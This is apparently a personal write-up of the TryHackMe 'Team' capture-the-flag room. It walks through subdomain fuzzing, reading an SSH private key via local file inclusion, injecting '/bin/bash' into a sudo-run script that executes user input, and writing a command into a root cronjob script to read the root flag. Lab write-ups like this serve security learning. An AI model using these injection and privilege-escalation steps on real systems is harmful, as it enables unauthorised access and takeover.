#dns #bash-injection

https://tryhackme.com/r/room/teamcw

---
#### Nmap
![[Screenshot_2024-06-11_10-49-51.png]]

I had to setup the `/etc/hosts` with the `team.thm` domain

![[Screenshot_2024-06-11_11-45-32.png]]

The `robots.txt` gave me `dale` 

Merci Alessio,
```shell
ffuf -u 'http://team.thm' -H 'Host:FUZZ.team.thm' -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1  
million-20000.txt -fs 11366
```

So I can get the development page on 
```shell
curl http://team.thm -H "Host: dev.team.thm"
```

I created a bash script to crawl in LFI and get all the available file contents. With that I used grep to find some clues and I got an private key ssh in `/etc/ssh/sshd_config` with no password

I can connect on `dale` through ssh now

There is another user named `gyles` and I can sudo run as him the `/home/gyles/admin_checks` with
```shell
sudo -u gyles /home/gyles/admin_checks
```

Now I need to find a way to insert a payload in this `admin_checks`:
```shell
#!/bin/bash  
  
printf "Reading stats.\n"  
sleep 1  
printf "Reading stats..\n"  
sleep 1  
read -p "Enter name of person backing up the data: " name  
echo $name  >> /var/stats/stats.txt  
read -p "Enter 'date' to timestamp the file: " error  
printf "The Date is "  
$error 2>/dev/null  
  
date_save=$(date "+%F-%H-%M")  
cp /var/stats/stats.txt /var/stats/stats-$date_save.bak  
  
printf "Stats have been backed up\n"
```

The payload were on the `error` variable and it was `/bin/bash`. It was possible because `error` is directly printed. It gave me a shell for the user `gyles` who can access the `/opt/admin_stuff` directory containing a `script.sh` running as sudo every minutes:
```shell
#!/bin/bash  
#I have set a cronjob to run this script every minute  
  
  
dev_site="/usr/local/sbin/dev_backup.sh"  
main_site="/usr/local/bin/main_backup.sh"  
#Back ups the sites locally  
$main_site  
$dev_site
```

`gyles` is in the `admin` group and this group can write on `main_backup.sh` so I put the following payload in it
```shell
cat /root/root.txt > /tmp/root
```

And here is the root flag
